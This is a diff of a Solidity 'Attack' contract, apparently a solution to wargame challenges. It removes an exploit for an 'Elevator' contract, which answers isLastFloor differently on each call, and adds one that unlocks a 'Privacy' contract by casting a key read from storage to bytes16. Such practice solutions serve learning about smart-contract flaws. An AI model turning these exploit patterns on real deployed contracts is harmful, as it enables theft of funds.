@@ -1,25 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./Elevator.sol";
+import "./Privacy.sol";
 
 contract Attack {
-    Elevator public elevatorContract;
-    bool toggle; // initial value is false
+    Privacy public privacyContract;
 
-    constructor(address _elevatorContracts) {
-        elevatorContract = Elevator(_elevatorContracts);
+    constructor(address _privacyContract) {
+        privacyContract = Privacy(_privacyContract);
     }
 
-    function isLastFloor(uint) external returns (bool) {
-        if (!toggle) {
-            toggle = true;
-            return false;
-        }
-        return true;
-    }
+    function attack(bytes32 _key) public {
+        // bytes32 key;
+        // // converts string into bytes 32
+        // assembly {
+        //     key := mload(add(_key, 32))
+        // }
 
-    function initiateAttack() public {
-        elevatorContract.goTo(5);
+        // converts bytes32 to bytes16
+        bytes16 finalKey = bytes16(_key);
+        privacyContract.unlock(finalKey);
     }
 }
